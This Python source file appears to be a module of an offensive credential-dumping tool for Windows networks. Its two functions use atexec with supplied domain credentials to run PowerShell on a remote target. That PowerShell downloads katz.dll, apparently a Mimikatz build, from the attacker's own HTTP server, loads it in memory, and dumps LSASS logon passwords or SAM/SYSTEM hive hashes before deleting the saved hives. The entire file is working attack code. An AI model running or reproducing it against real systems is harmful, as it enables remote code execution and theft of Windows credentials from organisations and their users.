import os,sys,time
import random, string
from datetime import datetime, date
from bin import atexec
import re

def time_stamp():
	today = date.today()
	now = datetime.now()
	timestamp = today.strftime('%d %B %Y {}').format(now.strftime("%H:%M:%S"))
	return timestamp

def lsassdump(domain,user,passw,target,localip,localport,host):
	print('->[+] Attempting Lsass Credential Dumping')
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "$a = (New-Object System.Net.WebClient).DownloadData(\'http://%s:%s/katz.dll\');$b = [System.Reflection.Assembly]::Load($a);$c = $b.GetType(\'T_.aT_\');$d = $c.GetMethod(\'Defrag\');$d.Invoke(0,\'logonpasswords,,,,,,,,,,,,,,,,,,,,,,,,,\')"' % (localip,localport), '%s - Lsass Credential Dump Performed Against %s' % (timestamp,host))
	os.system('sed -i "/Password : /c\[*]       Password : <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/NTLM     : /c\[*]       NT       : <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/LM     : /c\[*]       LM       : <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/SHA1     : /c\[*]       SHA1     : <redacted-by-lincox>" ./logs/debug_log.log')
	time.sleep(5)

def hivedump(domain,user,passw,target,localip,localport,host):
	print('->[+] Attempting SAM & SYSTEM Hive Dump')
	os.system('timeout 5 python3 -m http.server %s --directory ./tools/ > /dev/null 2>&1 &' % localport)
	timestamp = time_stamp()
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "reg save HKLM\\SAM C:\\SAM; reg save HKLM\\SYSTEM C:\\SYSTEM; $a = (New-Object System.Net.WebClient).DownloadData(\'http://%s:%s/katz.dll\');$b = [System.Reflection.Assembly]::Load($a);$c = $b.GetType(\'T_.aT_\');$d = $c.GetMethod(\'Defrag\');$d.Invoke(0,\'dumpsam,,,,,,,,,,,,,,,,,,,,,,,,C:\\SYSTEM,C:\\SAM\');"' % (localip,localport), '%s - SAM Hive Credential Dump Performed Against %s' % (timestamp,host))
	atexec.main('%s/%s:%s@%s' % (domain,user,passw,target),'powershell.exe -c "del C:\\SAM; del C:\\SYSTEM"','')
	os.system('sed -i "/Hash NTLM:/c\[*]  Hash NTLM: <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/Hash NTLM:/c\[*]  Hash NTLM: <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/lm  -/c\[*]    lm  -*: <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/ntlm-/c\[*]    ntlm-*: <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/aes256_hmac      /c\[*]     aes256_hmac : <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/aes128_hmac      /c\[*]     aes128_hmac : <redacted-by-lincox>" ./logs/debug_log.log')
	os.system('sed -i "/des_cbc_md5      /c\[*]     des_cbc_md5 : <redacted-by-lincox>" ./logs/debug_log.log')
	time.sleep(5)
